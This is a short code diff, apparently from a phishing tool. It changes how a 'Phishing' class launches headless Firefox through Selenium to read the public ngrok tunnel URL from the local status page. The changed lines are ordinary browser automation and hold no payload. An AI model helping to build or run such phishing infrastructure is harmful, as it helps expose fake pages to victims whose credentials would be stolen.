@@ -167,7 +167,7 @@ class Phishing:
 	def get_link(self):
 		options = Options()
 		options.add_argument('-headless')
-		driver = webdriver.Firefox(options=options, executable_path=f'{self.resources}/binaries/geckodriver', service_log_path=f'{self.resources}/logs/geckodriver.log')
+		driver = webdriver.Firefox(firefox_options=options, executable_path=f'{self.resources}/binaries/geckodriver', log_path=f'{self.resources}/logs/geckodriver.log')
 		wait = WebDriverWait(driver, timeout=10)
 		driver.get("http://localhost:4040/status")
 		ngrok_link = wait.until(expected.visibility_of_element_located((By.XPATH, '/html/body/div[2]/div/div/div/div[1]/div[1]/ul/li[1]/div/table/tbody/tr[1]/td'))).text
